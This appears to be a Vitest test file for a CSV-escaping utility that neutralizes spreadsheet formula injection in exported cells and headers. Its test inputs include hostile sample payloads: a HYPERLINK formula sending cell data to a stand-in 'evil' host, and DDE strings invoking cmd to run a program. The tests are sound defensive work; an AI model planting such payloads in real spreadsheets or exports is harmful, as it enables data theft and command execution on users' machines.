import { describe, it, expect } from 'vitest';
import {
  safeCell, safeCellText, escapeDelimitedField,
  primeVueExportCell, primeVueExportHeader,
} from '@/utils/csvSafe';

const HYPERLINK = '=HYPERLINK("http://evil/?"&A1,"Click")';

describe('safeCell', () => {
  it.each([
    ['=1+1', "'=1+1"],
    [HYPERLINK, `'${HYPERLINK}`],
    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
    ['+SUM(A1:A2)', "'+SUM(A1:A2)"],
    ['-2+3+cmd|\' /C calc\'!A0', "'-2+3+cmd|' /C calc'!A0"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\t=1+1', "'\t=1+1"],
    ['\r=1+1', "'\r=1+1"],
  ])('prefixes formula trigger %j with a quote', (input, expected) => {
    expect(safeCell(input)).toBe(expected);
  });

  it.each(['-5', '+5', '-1.25', '-.5', '+1.5e3', '-2E-7', '42'])(
    'leaves the plain numeric literal %j untouched', (input) => {
      expect(safeCell(input)).toBe(input);
    },
  );

  it('leaves safe text untouched, including triggers not in first position', () => {
    expect(safeCell('Alice')).toBe('Alice');
    expect(safeCell('a=b')).toBe('a=b');
    expect(safeCell(' =1+1')).toBe(' =1+1');
    expect(safeCell('')).toBe('');
  });

  it('only touches strings: numbers, booleans and null are returned as-is', () => {
    expect(safeCell(-5)).toBe(-5);
    expect(safeCell(true)).toBe(true);
    expect(safeCell(null)).toBeNull();
    expect(safeCell(undefined)).toBeUndefined();
  });
});

describe('safeCellText', () => {
  it('keeps typed negative numbers as numbers', () => {
    expect(safeCellText(-5)).toBe('-5');
    expect(safeCellText(-1.5e-3)).toBe('-0.0015');
    expect(safeCellText(false)).toBe('false');
  });

  it('renders null/undefined as empty', () => {
    expect(safeCellText(null)).toBe('');
    expect(safeCellText(undefined)).toBe('');
  });

  it('neutralizes non-string values whose String() form is a formula', () => {
    expect(safeCellText(['=1+1'])).toBe("'=1+1");
    expect(safeCellText({ toString: () => '@x' })).toBe("'@x");
  });
});

describe('escapeDelimitedField', () => {
  it('neutralizes then quotes per RFC 4180', () => {
    expect(escapeDelimitedField(HYPERLINK, ',')).toBe(`"'=HYPERLINK(""http://evil/?""&A1,""Click"")"`);
    expect(escapeDelimitedField('=1+1', ',')).toBe("'=1+1");
  });

  it('quotes a tab-led cell in TSV after neutralizing it', () => {
    expect(escapeDelimitedField('\t=1', '\t')).toBe(`"'\t=1"`);
  });

  it('keeps numbers and plain text unchanged', () => {
    expect(escapeDelimitedField(-5, ',')).toBe('-5');
    expect(escapeDelimitedField('-5', ',')).toBe('-5');
    expect(escapeDelimitedField('Alice, Jr', ',')).toBe('"Alice, Jr"');
    expect(escapeDelimitedField('line1\nline2', ',')).toBe('"line1\nline2"');
    expect(escapeDelimitedField(null, ',')).toBe('');
  });
});

describe('PrimeVue export hooks', () => {
  it('primeVueExportCell neutralizes and doubles inner quotes (PrimeVue adds the outer ones)', () => {
    expect(primeVueExportCell({ data: HYPERLINK, field: 'x' }))
      .toBe(`'=HYPERLINK(""http://evil/?""&A1,""Click"")`);
    expect(primeVueExportCell({ data: -5 })).toBe('-5');
    expect(primeVueExportCell({ data: 'say "hi"' })).toBe('say ""hi""');
  });

  it('primeVueExportHeader treats headers like cells', () => {
    expect(primeVueExportHeader('=evil')).toBe("'=evil");
    expect(primeVueExportHeader('na"me')).toBe('na""me');
  });
});
